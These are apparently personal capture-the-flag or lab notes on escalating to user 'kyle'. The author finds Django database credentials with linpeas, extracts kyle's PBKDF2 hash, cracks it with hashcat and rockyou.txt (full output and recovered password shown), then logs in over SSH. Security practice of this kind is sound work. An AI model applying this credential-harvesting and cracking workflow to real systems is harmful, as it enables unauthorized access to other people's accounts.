# Privilege escalation to user kyle
## Found django database username and password via linpeas
```bash
[client]
database = dev
user = djangouser
password = DjangoSuperPassword
```
![[Pasted image 20211004121212.png]]
## Got hash of kyle user using django database 
![[Pasted image 20211004124725.png]]
## Cracking hash of kyle user
Cracking hash `pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8dYWMGYlz4dSArozTY7wcZCS7DV6l5dpuXM4A=` via [google colab](https://colab.research.google.com/drive/1ykxECByMbELt0yCr9dUC6pVdMp21TGjh?authuser=1#scrollTo=cL4hNe6KLuIp)
```bash
!cd hashcat-6.2.4/ && ./hashcat -m 10000 /content/drive/MyDrive/hash.hash /content/drive/MyDrive/rockyou.txt

hashcat (v6.2.4) starting

* Device #1: This hardware has outdated CUDA compute capability (3.7).
             For modern OpenCL performance, upgrade to hardware that supports
             CUDA compute capability version 5.0 (Maxwell) or higher.
* Device #2: This hardware has outdated CUDA compute capability (3.7).
             For modern OpenCL performance, upgrade to hardware that supports
             CUDA compute capability version 5.0 (Maxwell) or higher.
nvmlDeviceGetFanSpeed(): Not Supported

CUDA API (CUDA 11.2)
====================
* Device #1: Tesla K80, 11382/11441 MB, 13MCU

OpenCL API (OpenCL 1.2 CUDA 11.2.109) - Platform #1 [NVIDIA Corporation]
========================================================================
* Device #2: Tesla K80, skipped

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt
* Slow-Hash-SIMD-LOOP

Watchdog: Temperature abort trigger set to 90c

Initializing backend runtime for device #1. Please be patient...tcmalloc: large alloc 2549088256 bytes == 0x563dd2214000 @  0x7f64dfa56001 0x563db3f42cd6 0x563db3f91fa2 0x563db3f39dcc 0x563db3f3a6b2 0x563db3f3588c 0x7f64dec88bf7 0x563db3f358ea
Host memory required for this attack: 2668 MB

Dictionary cache built:
* Filename..: /content/drive/MyDrive/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 6 secs

[s]tatus [p]ause [b]ypass [c]heckpoint [f]inish [q]uit => s


Session..........: hashcat
Status...........: Running
Hash.Mode........: 10000 (Django (PBKDF2-SHA256))
Hash.Target......: pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8...uXM4A=
Time.Started.....: Sat Oct  2 18:12:41 2021 (9 secs)
Time.Estimated...: Sat Oct  2 22:25:35 2021 (4 hours, 12 mins)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/content/drive/MyDrive/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:      946 H/s (6.75ms) @ Accel:4 Loops:32 Thr:1024 Vec:1
Recovered........: 0/1 (0.00%) Digests
Progress.........: 0/14344385 (0.00%)
Rejected.........: 0/0 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:36992-37024
Candidate.Engine.: Device Generator
Candidates.#1....: 123456 -> spook
Hardware.Mon.#1..: Temp: 78c Util: 97% Core: 732MHz Mem:2505MHz Bus:16

Cracking performance lower than expected?

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Append -S to the commandline.
  This has a drastic speed impact but can be better for specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.

* Update your backend API runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

[s]tatus [p]ause [b]ypass [c]heckpoint [f]inish [q]uit => s


Session..........: hashcat
Status...........: Running
Hash.Mode........: 10000 (Django (PBKDF2-SHA256))
Hash.Target......: pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8...uXM4A=
Time.Started.....: Sat Oct  2 18:12:41 2021 (21 secs)
Time.Estimated...: Sat Oct  2 22:25:36 2021 (4 hours, 12 mins)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/content/drive/MyDrive/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:      947 H/s (6.75ms) @ Accel:4 Loops:32 Thr:1024 Vec:1
Recovered........: 0/1 (0.00%) Digests
Progress.........: 0/14344385 (0.00%)
Rejected.........: 0/0 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:94016-94048
Candidate.Engine.: Device Generator
Candidates.#1....: 123456 -> spook
Hardware.Mon.#1..: Temp: 77c Util: 97% Core: 745MHz Mem:2505MHz Bus:16

[s]tatus [p]ause [b]ypass [c]heckpoint [f]inish [q]uit => 

Session..........: hashcat
Status...........: Running
Hash.Mode........: 10000 (Django (PBKDF2-SHA256))
Hash.Target......: pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8...uXM4A=
Time.Started.....: Sat Oct  2 18:12:41 2021 (21 secs)
Time.Estimated...: Sat Oct  2 22:25:35 2021 (4 hours, 12 mins)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/content/drive/MyDrive/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:      947 H/s (6.75ms) @ Accel:4 Loops:32 Thr:1024 Vec:1
Recovered........: 0/1 (0.00%) Digests
Progress.........: 0/14344385 (0.00%)
Rejected.........: 0/0 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:94048-94080
Candidate.Engine.: Device Generator
Candidates.#1....: 123456 -> spook
Hardware.Mon.#1..: Temp: 77c Util: 97% Core: 745MHz Mem:2505MHz Bus:16

pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8dYWMGYlz4dSArozTY7wcZCS7DV6l5dpuXM4A=:marcoantonio
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 10000 (Django (PBKDF2-SHA256))
Hash.Target......: pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8...uXM4A=
Time.Started.....: Sat Oct  2 18:12:41 2021 (57 secs)
Time.Estimated...: Sat Oct  2 18:13:38 2021 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/content/drive/MyDrive/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:      952 H/s (6.66ms) @ Accel:4 Loops:32 Thr:1024 Vec:1
Recovered........: 1/1 (100.00%) Digests
Progress.........: 53248/14344385 (0.37%)
Rejected.........: 0/53248 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:259968-259999
Candidate.Engine.: Device Generator
Candidates.#1....: 123456 -> spook
Hardware.Mon.#1..: Temp: 73c Util: 97% Core: 745MHz Mem:2505MHz Bus:16

Started: Sat Oct  2 18:12:24 2021
Stopped: Sat Oct  2 18:13:39 2021

```
cracked hash `pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8dYWMGYlz4dSArozTY7wcZCS7DV6l5dpuXM4A=:marcoantonio`.
## Using cracked hash to ssh login as kyle
![[Pasted image 20211004125705.png]]
